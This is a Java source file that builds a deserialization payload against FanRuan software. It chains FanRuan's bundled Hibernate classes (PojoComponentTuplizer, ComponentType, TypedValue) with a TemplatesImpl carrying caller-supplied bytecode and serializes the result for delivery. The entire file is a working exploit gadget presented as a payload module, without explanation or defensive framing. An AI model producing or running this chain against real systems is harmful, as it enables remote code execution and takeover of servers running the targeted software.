package com.example.frchannel.payload;



import com.fr.third.org.hibernate.type.ComponentType;
import com.fr.third.org.hibernate.engine.spi.TypedValue;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import sun.reflect.ReflectionFactory;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class HibernateWhithFanruan {

    public static byte[] getpayload(byte[] bytes) throws Exception {

        TemplatesImpl templates = utils.getTeml(bytes);

        Class clazz = Class.forName("com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer");
        Constructor constructor = Object.class.getDeclaredConstructor();
        constructor.setAccessible(true);
        Constructor pojoct = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz, constructor);
        pojoct.setAccessible(true);
        Object pojoCT = pojoct.newInstance();

        Class clazz1 = Class.forName("com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer");
        Class clazz4 = Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor constructor4 = clazz4.getDeclaredConstructor(Class.class, String.class, Method.class);
        Object getter = constructor4.newInstance(templates.getClass(), "outputProperties", templates.getClass().getMethod("getOutputProperties"));
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        Field f = clazz1.getDeclaredField("getters");
        f.setAccessible(true);
        f.set(pojoCT, getters);

        Class clazz3 = Class.forName("com.fr.third.org.hibernate.type.ComponentType");
        Constructor constructor2 = Object.class.getDeclaredConstructor();
        constructor2.setAccessible(true);
        Constructor constructor3 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz3, constructor2);
        ComponentType componentType = (ComponentType) constructor3.newInstance();
        TypedValue typedValue = new TypedValue(componentType, null);
        utils.setFieldValue(componentType, "componentTuplizer", pojoCT);

        utils.setFieldValue(componentType, "propertySpan", 1);

        HashMap<Object, String> map = new HashMap<>();
        map.put(typedValue, "1jzz");
        //Object template = Gadgets.createTemplatesImpl("TomcatEcho");
        utils.setFieldValue(typedValue, "value", templates);


        //SerialUtil.unserial(SerialUtil.serial(map));
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        ObjectOutputStream objectOutput = new ObjectOutputStream(byteArrayOutputStream);
        objectOutput.writeObject(map);
        byte[] data = byteArrayOutputStream.toByteArray();
        return data;

    }
    
}